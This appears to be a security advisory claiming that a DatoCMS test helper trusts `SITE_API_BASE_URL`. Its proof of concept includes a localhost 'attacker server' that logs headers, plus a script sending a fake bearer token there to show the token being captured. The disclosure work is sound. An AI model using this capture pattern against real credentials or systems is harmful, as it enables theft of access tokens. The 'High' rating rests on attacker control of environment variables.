## Summary

The `generateNewCmaClient` helper function in the `datocms/js-rest-api-clients` repository trusts the `SITE_API_BASE_URL` environment variable without validation.

An attacker who can influence this variable can redirect API requests—including those containing the newly created site's access token—to their own server, potentially resulting in complete compromise of the DatoCMS project.

**Severity:** High
**Affected Component:** `jest-helpers/generateNewCmaClient.ts` (and any code using similar patterns)
**Impact:** Full token disclosure, potential unauthorized data access and modification.

## Vulnerability Details

The vulnerable code snippet:

### Vulnerable Code

```typescript
export const baseConfigOptions: Partial<ClientConfigOptions> = {
  baseUrl: process.env.SITE_API_BASE_URL,
  fetchFn,
};

export async function generateNewCmaClient(
  extraConfig?: Partial<ClientConfigOptions>,
) {
  const dashboardClient = await generateNewDashboardClient();
  const randomString =
    Math.random().toString(36).substring(7) + new Date().getTime();

  const site = await dashboardClient.sites.create({
    name: `Project ${randomString}`,
  });

  return buildClient({
    ...extraConfig,
    apiToken: site.access_token!,
    ...baseConfigOptions,
  });
}
```

The important part is:

```typescript
baseUrl: process.env.SITE_API_BASE_URL,
```

The `SITE_API_BASE_URL` value is used directly without validation, while the newly created site's `access_token` is subsequently supplied to `buildClient()`.

If an attacker can control `SITE_API_BASE_URL`, API requests may be redirected to an attacker-controlled endpoint, potentially exposing the access token.


## Proof of Concept

### Preconditions

* Node.js environment with the repository cloned and dependencies installed.
* Ability to set the `SITE_API_BASE_URL` environment variable.
* A simple HTTP server to act as the attacker-controlled endpoint.

### Steps to Reproduce

1. **Create an attacker-controlled server** (`attacker-server.js`) that logs incoming request headers:

```javascript
const http = require('http');

http.createServer((req, res) => {
  let body = '';

  req.on('data', chunk => body += chunk);

  req.on('end', () => {
    console.log('--- Incoming request ---');
    console.log('URL:', req.url);
    console.log('Headers:', JSON.stringify(req.headers, null, 2));

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
  });
}).listen(8787, () => {
  console.log('Attacker server listening on http://localhost:8787');
});
```

Run the server in a terminal:

```bash
node attacker-server.js
```

2. **Prepare a standalone PoC script** (`standalone-poc.js`) that mimics the vulnerable logic:

```javascript
const { fetch: ponyfillFetch } = require('@whatwg-node/fetch');
const { buildClient } = require('@datocms/cma-client-node');

const fetchFn = typeof fetch === 'undefined' ? ponyfillFetch : fetch;

// Attacker-controlled base URL
const baseUrl = process.env.SITE_API_BASE_URL;

// Fake token used for demonstration purposes.
// In the vulnerable application, this would be the actual site access token.
const accessToken = 'FAKE_SECRET_TOKEN_12345';

const client = buildClient({
  apiToken: accessToken,
  baseUrl,
  fetchFn,
});

// Trigger an API request.
// The authorization token will be sent to the configured baseUrl.
client.items.list()
  .then(() => console.log('Request sent'))
  .catch(err =>
    console.error('Request failed (expected for fake token):', err.message)
  );
```

3. **Set the malicious base URL and run the PoC:**

```bash
export SITE_API_BASE_URL=http://localhost:8787
node standalone-poc.js
```

4. **Observe the attacker-controlled server output:**

```text
--- Incoming request ---
URL: /items
Headers: {
  "host": "localhost:8787",
  "connection": "keep-alive",
  "content-type": "application/json",
  "accept": "application/json",
  "authorization": "Bearer FAKE_SECRET_TOKEN_12345",
  "user-agent": "@datocms/cma-client v6.2.0",
  "x-api-version": "3",
  "accept-language": "*",
  "sec-fetch-mode": "cors",
  "accept-encoding": "gzip, deflate"
}
```

The `authorization` header contains the token that would normally be sent to the legitimate DatoCMS API.

In this proof of concept, a fake token is used to demonstrate the behavior safely. In the vulnerable application, if an attacker can influence `SITE_API_BASE_URL`, the actual site access token generated by `generateNewCmaClient` could potentially be sent to the attacker-controlled endpoint.

---

## Impact

* **Token theft:** An attacker may obtain a valid DatoCMS site access token.
* **Unauthorized access:** Depending on the token's permissions, the attacker may be able to read, modify, or delete content associated with the affected project.
* **Project compromise:** A stolen token could allow unauthorized operations against the affected DatoCMS project.
* **Potential lateral movement:** Depending on the token's scope and the application's architecture, the compromised credentials may enable additional unauthorized actions.
